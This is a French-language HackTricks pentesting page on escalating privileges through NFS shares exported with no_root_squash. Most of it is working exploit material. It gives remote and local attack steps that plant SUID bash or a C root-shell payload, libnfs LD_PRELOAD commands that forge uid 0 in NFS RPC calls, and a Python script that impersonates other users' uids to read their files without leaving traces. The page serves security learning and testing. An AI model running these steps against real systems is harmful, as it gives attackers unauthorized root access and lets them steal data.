<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Lisez le fichier _ **/etc/exports** _, si vous trouvez un répertoire configuré comme **no\_root\_squash**, alors vous pouvez **y accéder** **en tant que client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

**no\_root\_squash** : Cette option donne essentiellement l'autorité à l'utilisateur root sur le client pour accéder aux fichiers sur le serveur NFS en tant que root. Et cela peut entraîner de graves implications de sécurité.

**no\_all\_squash** : Cette option est similaire à **no\_root\_squash** mais s'applique aux **utilisateurs non root**. Imaginez que vous ayez un shell en tant qu'utilisateur nobody ; vous avez vérifié le fichier /etc/exports ; l'option no\_all\_squash est présente ; vérifiez le fichier /etc/passwd ; émulez un utilisateur non root ; créez un fichier suid en tant que cet utilisateur (en montant via nfs). Exécutez le suid en tant qu'utilisateur nobody et devenez un utilisateur différent.

# Élévation de Privilèges

## Exploit à Distance

Si vous avez trouvé cette vulnérabilité, vous pouvez l'exploiter :

* **Montez ce répertoire** sur une machine cliente, et **en tant que root copiez** à l'intérieur du dossier monté le binaire **/bin/bash** et donnez-lui des droits **SUID**, et **exécutez depuis la machine victime** ce binaire bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montage de ce répertoire** sur une machine cliente, et **en tant que root copie** à l'intérieur du dossier monté notre payload compilé qui abusera de la permission SUID, lui donner **des droits SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploit Local

{% hint style="info" %}
Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version Remote pour exploiter cette élévation de privilèges en tunnelisant les ports requis**.\
L'astuce suivante est dans le cas où le fichier `/etc/exports` **indique une adresse IP**. Dans ce cas, vous **ne pourrez pas utiliser** dans tous les cas l'**exploit à distance** et vous devrez **abuser de cette astuce**.\
Une autre condition requise pour que l'exploit fonctionne est que **l'exportation dans `/etc/export`** **doit utiliser le drapeau `insecure`**.\
\--_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, cette astuce fonctionnera_--
{% endhint %}

**Astuce copiée de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Maintenant, supposons que le serveur de partage exécute toujours `no_root_squash` mais qu'il y a quelque chose qui nous empêche de monter le partage sur notre machine de pentesting. Cela se produirait si le `/etc/exports` a une liste explicite d'adresses IP autorisées à monter le partage.

L'affichage des partages montre maintenant que seule la machine sur laquelle nous essayons de privesc est autorisée à le monter :
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Cela signifie que nous sommes coincés à exploiter le partage monté sur la machine localement à partir d'un utilisateur non privilégié. Mais il se trouve qu'il existe un autre exploit local moins connu.

Cet exploit repose sur un problème dans la spécification NFSv3 qui stipule que c'est au client d'annoncer son uid/gid lors de l'accès au partage. Ainsi, il est possible de falsifier l'uid/gid en forgeant les appels RPC NFS si le partage est déjà monté !

Voici une [bibliothèque qui vous permet de faire exactement cela](https://github.com/sahlberg/libnfs).

### Compiler l'exemple <a href="#compiling-the-example" id="compiling-the-example"></a>

Selon votre noyau, vous pourriez avoir besoin d'adapter l'exemple. Dans mon cas, j'ai dû commenter les appels système fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Exploitation en utilisant la bibliothèque <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Utilisons l'exploit le plus simple :
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Placez notre exploit sur le partage et rendez-le suid root en simulant notre uid dans les appels RPC :
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Tout ce qu'il reste à faire est de le lancer :
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
Nous y voilà, élévation de privilèges en tant que root local !

## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Une fois root local sur la machine, je voulais fouiller le partage NFS à la recherche de secrets potentiels qui me permettraient de pivoter. Mais il y avait de nombreux utilisateurs du partage, chacun avec son propre uid que je ne pouvais pas lire malgré le fait d'être root à cause du décalage des uid. Je ne voulais pas laisser de traces évidentes telles qu'un chown -R, alors j'ai écrit un petit extrait de code pour définir mon uid avant d'exécuter la commande shell souhaitée :
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Vous pouvez ensuite exécuter la plupart des commandes comme vous le feriez normalement en les préfixant avec le script :
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
